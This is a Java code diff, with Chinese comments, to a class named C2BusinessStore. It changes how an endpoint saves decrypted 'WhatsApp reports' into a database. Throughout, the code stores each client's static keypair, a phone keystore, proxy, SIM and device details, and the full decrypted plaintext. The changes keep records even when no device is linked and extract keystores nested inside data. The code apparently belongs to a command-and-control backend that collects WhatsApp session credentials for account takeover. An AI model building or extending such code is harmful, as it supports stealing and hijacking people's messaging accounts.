@@ -961,17 +961,20 @@ public class C2BusinessStore {
 
     // ---------- /api/wp/t ----------
 
-    /** WhatsApp 上报落库 → wp_report */
+    /** WhatsApp 上报落库 → wp_report。无设备也写入（device_row_id 为空），避免 account 包被丢掉。 */
     public void saveWpReport(C2HandlerContext ctx, JSONObject plaintext) {
-        if (!hasDeviceRow(ctx)) {
-            log.info("异常日志:[c2_handlers][wp_report] 无 device_row_id，跳过写入, recordId={}",
+        String raw = ctx.getRawText() == null ? "" : ctx.getRawText();
+        String plainJson = ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson();
+        if ((plaintext == null || plaintext.isEmpty()) && raw.isEmpty() && plainJson.isEmpty()) {
+            log.info("异常日志:[c2_handlers][wp_report] 无明文，跳过写入, recordId={}",
                     ctx.getRecordId());
             return;
         }
         try {
             WpReportEntity e = new WpReportEntity();
             e.setC2RecordId((int) ctx.getRecordId());
-            e.setDeviceRowId(ctx.getDeviceRowId());
+            Integer deviceRowId = ctx.getDeviceRowId();
+            e.setDeviceRowId(deviceRowId != null && deviceRowId > 0 ? deviceRowId : null);
             e.setClientIp(ctx.getClientIp());
             e.setXTs(ctx.getXTs());
             e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
@@ -984,12 +987,12 @@ public class C2BusinessStore {
                     ctx.getChannelcode() == null ? "" : ctx.getChannelcode()));
             e.setApiType(str(plaintext, "apiType"));
             e.setAppVersion(str(plaintext, "_version"));
-            e.setUserId(str(plaintext, "userId"));
-            e.setPhoneId(str(plaintext, "phoneId"));
+            String account = str(plaintext, "account");
+            e.setUserId(firstNonEmpty(str(plaintext, "userId"), account));
+            e.setPhoneId(firstNonEmpty(str(plaintext, "phoneId"), account));
             e.setNickname(str(plaintext, "nickname"));
             e.setClientStaticKeypairBase64(str(plaintext, "clientStaticKeypairBase64"));
-            Object keyStore = plaintext == null ? null : plaintext.get("phoneKeyStore");
-            e.setPhoneKeystoreJson(keyStore == null ? "" : JSONObject.toJSONString(keyStore));
+            e.setPhoneKeystoreJson(extractPhoneKeystore(plaintext));
             Object deviceConfig = plaintext == null ? null : plaintext.get("deviceConfig");
             e.setDeviceConfigJson(deviceConfig == null ? "" : JSONObject.toJSONString(deviceConfig));
             Object deviceInfo = plaintext == null ? null : plaintext.get("deviceInfo");
@@ -1001,18 +1004,51 @@ public class C2BusinessStore {
             e.setProxy(str(plaintext, "proxy"));
             e.setSimOperator(str(plaintext, "sim_operator"));
             Object data = plaintext == null ? null : plaintext.get("data");
-            e.setDataJson(data == null ? "" : JSONObject.toJSONString(data));
-            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
+            e.setDataJson(data == null ? "" : (data instanceof String
+                    ? (String) data : JSONObject.toJSONString(data)));
+            // 截断包时 plaintextJson 只有抽出的字段，完整解密文本在 raw
+            e.setPlaintextJson(!raw.isEmpty() ? raw : plainJson);
             double now = System.currentTimeMillis() / 1000.0;
             e.setDecryptedAt(now);
             e.setAddtime(now);
             wpReportDao.insert(e);
-            log.info("正常日志:[c2_handlers][wp_report] 写入成功, recordId={}, id={}, userId={}, phoneId={}",
-                    ctx.getRecordId(), e.getId(), e.getUserId(), e.getPhoneId());
+            log.info("正常日志:[c2_handlers][wp_report] 写入成功, recordId={}, id={}, userId={}, phoneId={}, deviceRowId={}, ksLen={}",
+                    ctx.getRecordId(), e.getId(), e.getUserId(), e.getPhoneId(),
+                    e.getDeviceRowId(), e.getPhoneKeystoreJson() == null ? 0 : e.getPhoneKeystoreJson().length());
         } catch (Exception ex) {
             log.info("异常日志:[c2_handlers][wp_report] 写入失败, recordId={}, err={}",
                     ctx.getRecordId(), ex.getMessage());
         }
+    }
+
+    /** phoneKeyStore 可能在顶层，也可能嵌在 data 的 JSON 字符串里。 */
+    private static String extractPhoneKeystore(JSONObject plaintext) {
+        if (plaintext == null) {
+            return "";
+        }
+        Object keyStore = plaintext.get("phoneKeyStore");
+        if (keyStore == null) {
+            Object data = plaintext.get("data");
+            if (data instanceof JSONObject) {
+                keyStore = ((JSONObject) data).get("phoneKeyStore");
+            } else if (data instanceof String) {
+                String ds = ((String) data).trim();
+                if (ds.startsWith("{")) {
+                    try {
+                        JSONObject inner = JSONObject.parseObject(ds);
+                        if (inner != null) {
+                            keyStore = inner.get("phoneKeyStore");
+                        }
+                    } catch (Exception ignore) {
+                        keyStore = ds;
+                    }
+                }
+            }
+        }
+        if (keyStore == null) {
+            return "";
+        }
+        return keyStore instanceof String ? (String) keyStore : JSONObject.toJSONString(keyStore);
     }
 
     // ---------- helpers ----------
